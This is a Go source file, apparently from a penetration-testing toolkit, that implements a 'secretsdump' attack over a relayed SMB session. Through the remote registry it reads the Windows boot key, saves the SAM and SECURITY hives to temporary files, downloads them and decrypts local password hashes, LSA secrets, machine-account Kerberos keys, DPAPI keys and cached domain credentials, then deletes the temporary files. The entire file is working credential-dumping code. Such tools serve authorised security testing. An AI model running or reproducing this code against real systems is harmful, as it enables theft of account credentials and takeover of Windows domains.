package relay

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"strings"

	"gopacket/internal/build"
	"gopacket/pkg/dcerpc"
	"gopacket/pkg/dcerpc/winreg"
	"gopacket/pkg/registry"
)

// SecretsdumpAttack dumps SAM hashes and LSA secrets via remote registry.
type SecretsdumpAttack struct{}

func (a *SecretsdumpAttack) Name() string { return "secretsdump" }

func (a *SecretsdumpAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("secretsdump attack requires SMB session")
	}
	return secretsdumpAttack(client, config)
}

func secretsdumpAttack(client *SMBRelayClient, cfg *Config) error {
	log.Printf("[*] Dumping SAM hashes via remote registry on %s", cfg.TargetAddr)

	// Step 1: Connect to IPC$ and open winreg pipe
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("winreg")
	if err != nil {
		return fmt.Errorf("open winreg pipe: %v", err)
	}

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to winreg
	if err := rpcClient.Bind(winreg.UUID, winreg.MajorVersion, winreg.MinorVersion); err != nil {
		client.ClosePipe(fileID)
		return fmt.Errorf("bind winreg: %v", err)
	}

	if build.Debug {
		log.Printf("[D] Secretsdump: bound to winreg interface")
	}

	// Step 2: Get boot key
	bootKey, err := getBootKeyViaRelay(rpcClient)
	if err != nil {
		client.ClosePipe(fileID)
		return fmt.Errorf("get boot key: %v", err)
	}

	log.Printf("[*] Target system bootKey: 0x%s", hex.EncodeToString(bootKey))

	// Step 3: Save SAM and SECURITY hives to temp files
	hklm, err := winreg.OpenLocalMachine(rpcClient, winreg.MAXIMUM_ALLOWED)
	if err != nil {
		client.ClosePipe(fileID)
		return fmt.Errorf("open HKLM: %v", err)
	}

	samTempFile, err := saveHiveViaRelay(rpcClient, hklm, "SAM")
	if err != nil {
		log.Printf("[-] Failed to save SAM hive: %v", err)
	}

	secTempFile, err := saveHiveViaRelay(rpcClient, hklm, "SECURITY")
	if err != nil {
		log.Printf("[-] Failed to save SECURITY hive: %v", err)
	}

	// Close winreg pipe and HKLM handle (done with registry ops)
	winreg.BaseRegCloseKey(rpcClient, hklm)
	client.ClosePipe(fileID)

	// Step 4: Download and process SAM hive
	if samTempFile != "" {
		log.Printf("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)")

		samData, err := client.DownloadFile("ADMIN$", "Temp\\"+samTempFile)
		if err != nil {
			log.Printf("[-] Failed to download SAM hive: %v", err)
		} else {
			samHive, err := registry.Open(samData)
			if err != nil {
				log.Printf("[-] Failed to parse SAM hive: %v", err)
			} else {
				users, err := registry.DumpSAM(samHive, bootKey)
				if err != nil {
					log.Printf("[-] Failed to dump SAM: %v", err)
				} else {
					for _, user := range users {
						lmHash := hex.EncodeToString(user.LMHash)
						ntHash := hex.EncodeToString(user.NTHash)
						log.Printf("%s:%d:%s:%s:::", user.Username, user.RID, lmHash, ntHash)
					}
				}
			}
		}
	}

	// Step 5: Download and process SECURITY hive
	if secTempFile != "" {
		log.Printf("[*] Dumping LSA Secrets")

		secData, err := client.DownloadFile("ADMIN$", "Temp\\"+secTempFile)
		if err != nil {
			log.Printf("[-] Failed to download SECURITY hive: %v", err)
		} else {
			secHive, err := registry.Open(secData)
			if err != nil {
				log.Printf("[-] Failed to parse SECURITY hive: %v", err)
			} else {
				domainInfo, _ := registry.GetDomainInfo(secHive)
				dumpLSASecretsFromHive(secHive, bootKey, domainInfo)
				dumpCachedCredsFromHive(secHive, bootKey)
			}
		}
	}

	// Step 6: Cleanup temp files
	cleanupTempFiles(client, samTempFile, secTempFile)

	return nil
}

// getBootKeyViaRelay retrieves the boot key using the relay winreg connection
func getBootKeyViaRelay(rpcClient *dcerpc.Client) ([]byte, error) {
	// Open HKLM
	hklm, err := winreg.OpenLocalMachine(rpcClient, winreg.MAXIMUM_ALLOWED)
	if err != nil {
		return nil, fmt.Errorf("open HKLM: %v", err)
	}
	defer winreg.BaseRegCloseKey(rpcClient, hklm)

	// Get current control set
	selectKey, err := winreg.BaseRegOpenKey(rpcClient, hklm, "SYSTEM\\Select", 1, winreg.KEY_READ)
	if err != nil {
		return nil, fmt.Errorf("open SYSTEM\\Select: %v", err)
	}

	_, data, err := winreg.BaseRegQueryValue(rpcClient, selectKey, "Current")
	winreg.BaseRegCloseKey(rpcClient, selectKey)
	if err != nil {
		return nil, fmt.Errorf("read Current value: %v", err)
	}

	if len(data) < 4 {
		return nil, fmt.Errorf("invalid Current value")
	}

	current := uint32(data[0]) | uint32(data[1])<<8 | uint32(data[2])<<16 | uint32(data[3])<<24
	controlSet := fmt.Sprintf("ControlSet%03d", current)

	if build.Debug {
		log.Printf("[D] Secretsdump: using %s", controlSet)
	}

	// Read class names from JD, Skew1, GBG, Data keys
	keyNames := []string{"JD", "Skew1", "GBG", "Data"}
	var bootKeyParts []byte

	for _, keyName := range keyNames {
		path := fmt.Sprintf("SYSTEM\\%s\\Control\\Lsa\\%s", controlSet, keyName)

		keyHandle, err := winreg.BaseRegOpenKey(rpcClient, hklm, path, 1, winreg.KEY_READ)
		if err != nil {
			return nil, fmt.Errorf("open %s: %v", path, err)
		}

		keyInfo, err := winreg.BaseRegQueryInfoKey(rpcClient, keyHandle)
		winreg.BaseRegCloseKey(rpcClient, keyHandle)
		if err != nil {
			return nil, fmt.Errorf("query info for %s: %v", path, err)
		}

		if build.Debug {
			log.Printf("[D] Secretsdump: %s class name: %s", keyName, keyInfo.ClassName)
		}

		bootKeyParts = append(bootKeyParts, []byte(keyInfo.ClassName)...)
	}

	// Descramble the boot key
	return descrambleBootKey(bootKeyParts)
}

// descrambleBootKey descrambles the boot key from class name parts
// (same algorithm as winreg/remote.go)
var relayBootKeyPermutation = []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}

func descrambleBootKey(scrambled []byte) ([]byte, error) {
	scrambledStr := strings.ToLower(string(scrambled))
	if len(scrambledStr) != 32 {
		return nil, fmt.Errorf("invalid boot key parts length: %d (expected 32)", len(scrambledStr))
	}

	decoded, err := hex.DecodeString(scrambledStr)
	if err != nil {
		return nil, fmt.Errorf("failed to decode boot key: %v", err)
	}

	bootKey := make([]byte, 16)
	for i := 0; i < 16; i++ {
		bootKey[i] = decoded[relayBootKeyPermutation[i]]
	}

	return bootKey, nil
}

// saveHiveViaRelay saves a registry hive to a remote temp file
func saveHiveViaRelay(rpcClient *dcerpc.Client, hklm []byte, hiveName string) (string, error) {
	hiveKey, err := winreg.BaseRegOpenKey(rpcClient, hklm, hiveName, 1, winreg.MAXIMUM_ALLOWED)
	if err != nil {
		return "", fmt.Errorf("open %s: %v", hiveName, err)
	}
	defer winreg.BaseRegCloseKey(rpcClient, hiveKey)

	// Generate random filename
	randBytes := make([]byte, 4)
	rand.Read(randBytes)
	fileName := hex.EncodeToString(randBytes) + ".tmp"
	remotePath := "..\\Temp\\" + fileName // Relative to SYSTEM32

	if build.Debug {
		log.Printf("[D] Secretsdump: saving %s to %s", hiveName, remotePath)
	}

	if err := winreg.BaseRegSaveKey(rpcClient, hiveKey, remotePath); err != nil {
		return "", fmt.Errorf("save %s: %v", hiveName, err)
	}

	log.Printf("[*] Saved %s hive to remote temp file", hiveName)
	return fileName, nil
}

// dumpLSASecretsFromHive dumps LSA secrets from a parsed SECURITY hive
func dumpLSASecretsFromHive(secHive *registry.Hive, bootKey []byte, domainInfo *registry.DomainInfo) {
	secrets, err := registry.DumpLSASecrets(secHive, bootKey)
	if err != nil {
		log.Printf("[-] Failed to dump LSA secrets: %v", err)
		return
	}

	for _, secret := range secrets {
		if len(secret.Value) == 0 {
			continue
		}

		if strings.Contains(secret.Name, "$MACHINE.ACC") {
			computerName := ""
			if domainInfo != nil {
				computerName = domainInfo.ComputerName
			}
			if computerName == "" {
				computerName = strings.TrimSuffix(secret.Name, ".ACC")
			}

			prefix := ""
			if domainInfo != nil && domainInfo.NetBIOSName != "" {
				prefix = domainInfo.NetBIOSName + "\\" + computerName + "$"
			} else {
				prefix = computerName + "$"
			}

			machineKeys := registry.DeriveMachineAccountKeys(secret.Value,
				getDomainDNS(domainInfo), computerName)

			if machineKeys.AES256Key != nil {
				log.Printf("%s:aes256-cts-hmac-sha1-96:%s", prefix, hex.EncodeToString(machineKeys.AES256Key))
			}
			if machineKeys.AES128Key != nil {
				log.Printf("%s:aes128-cts-hmac-sha1-96:%s", prefix, hex.EncodeToString(machineKeys.AES128Key))
			}
			if machineKeys.DESKey != nil {
				log.Printf("%s:des-cbc-md5:%s", prefix, hex.EncodeToString(machineKeys.DESKey))
			}
			log.Printf("%s:plain_password_hex:%s", prefix, hex.EncodeToString(secret.Value))
			if machineKeys.NTHash != nil {
				log.Printf("%s:aad3b435b51404eeaad3b435b51404ee:%s:::", prefix, hex.EncodeToString(machineKeys.NTHash))
			}
		} else if secret.Name == "DPAPI_SYSTEM" {
			keys := registry.ParseDPAPISecret(secret.Value)
			if keys != nil {
				log.Printf("dpapi_machinekey:0x%s", hex.EncodeToString(keys.MachineKey))
				log.Printf("dpapi_userkey:0x%s", hex.EncodeToString(keys.UserKey))
			}
		} else if secret.Name == "NL$KM" {
			log.Printf("NL$KM:%s", hex.EncodeToString(secret.Value))
		} else {
			log.Printf("[*] %s", secret.Name)
			log.Printf("    %s", hex.EncodeToString(secret.Value))
		}
	}
}

// dumpCachedCredsFromHive dumps cached domain credentials from a parsed SECURITY hive
func dumpCachedCredsFromHive(secHive *registry.Hive, bootKey []byte) {
	cachedCreds, err := registry.DumpCachedCredentials(secHive, bootKey)
	if err != nil {
		log.Printf("[-] Failed to dump cached credentials: %v", err)
		return
	}

	if len(cachedCreds) > 0 {
		log.Printf("[*] Dumping cached domain logon information (domain/username:hash)")
		for _, cred := range cachedCreds {
			if cred.Username != "" {
				log.Printf("%s/%s:%s", cred.Domain, cred.Username, hex.EncodeToString(cred.EncryptedHash))
			}
		}
	}
}

// cleanupTempFiles removes temporary hive files from the target
func cleanupTempFiles(client *SMBRelayClient, samFile, secFile string) {
	files := []string{samFile, secFile}
	for _, f := range files {
		if f == "" {
			continue
		}
		if err := client.DeleteFile("ADMIN$", "Temp\\"+f); err != nil {
			if build.Debug {
				log.Printf("[D] Secretsdump: failed to delete %s: %v", f, err)
			}
		} else {
			if build.Debug {
				log.Printf("[D] Secretsdump: deleted temp file %s", f)
			}
		}
	}
	log.Printf("[*] Cleanup complete")
}

// getDomainDNS returns the DNS domain name from domain info, or empty string
func getDomainDNS(info *registry.DomainInfo) string {
	if info != nil {
		return info.DNSDomainName
	}
	return ""
}
